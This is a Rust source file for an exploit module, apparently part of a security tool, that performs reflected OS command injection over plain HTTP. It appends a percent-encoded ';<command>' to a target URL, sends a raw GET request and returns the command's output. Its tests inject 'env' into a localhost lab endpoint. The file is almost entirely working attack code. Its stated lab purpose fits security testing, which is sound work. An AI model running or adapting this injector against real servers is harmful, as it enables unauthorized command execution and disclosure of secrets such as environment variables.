//! A reflected OS-command-injection exploiter over plain HTTP.
//!
//! It appends `;<command>` to the target URL's query string and returns the response body, which for
//! a reflected injection contains the command's output. Plain HTTP only — suitable for a local lab
//! target; TLS and richer transports are a later concern.

use searu_domain::ports::{ExploitError, ReflectedCommandInjector};
use std::io::{Read, Write};
use std::net::TcpStream;

pub struct HttpCommandInjector;

impl ReflectedCommandInjector for HttpCommandInjector {
    fn exploit(&self, target: &str, command: &str) -> Result<String, ExploitError> {
        let url = inject(target, command);
        http_get(&url).map_err(ExploitError::Request)
    }
}

fn inject(target: &str, command: &str) -> String {
    format!("{target}{}", percent_encode(&format!(";{command}")))
}

fn percent_encode(input: &str) -> String {
    let mut encoded = String::new();
    for byte in input.bytes() {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.' | b'~') {
            encoded.push(byte as char);
        } else {
            encoded.push_str(&format!("%{byte:02X}"));
        }
    }
    encoded
}

fn http_get(url: &str) -> Result<String, String> {
    let rest = url
        .strip_prefix("http://")
        .ok_or_else(|| "only http:// targets are supported".to_string())?;
    let (authority, path) = match rest.find('/') {
        Some(index) => (&rest[..index], &rest[index..]),
        None => (rest, "/"),
    };
    let (host, port) = match authority.rsplit_once(':') {
        Some((host, port)) => (
            host,
            port.parse::<u16>()
                .map_err(|_| format!("bad port: {port}"))?,
        ),
        None => (authority, 80),
    };

    let mut stream = TcpStream::connect((host, port)).map_err(|e| e.to_string())?;
    let request =
        format!("GET {path} HTTP/1.0\r\nHost: {host}\r\nConnection: close\r\nAccept: */*\r\n\r\n");
    stream
        .write_all(request.as_bytes())
        .map_err(|e| e.to_string())?;

    let mut response = Vec::new();
    stream
        .read_to_end(&mut response)
        .map_err(|e| e.to_string())?;
    let text = String::from_utf8_lossy(&response);
    Ok(text
        .split_once("\r\n\r\n")
        .map(|(_, body)| body.to_string())
        .unwrap_or_else(|| text.into_owned()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn percent_encodes_shell_metacharacters() {
        assert_eq!(percent_encode(";env"), "%3Benv");
        assert_eq!(percent_encode("a b"), "a%20b");
        assert_eq!(percent_encode("keep-._~"), "keep-._~");
    }

    #[test]
    fn injection_appends_the_encoded_command_to_the_query() {
        assert_eq!(
            inject("http://localhost:5000/cmd/dig?ip_addr=1", "env"),
            "http://localhost:5000/cmd/dig?ip_addr=1%3Benv"
        );
    }
}
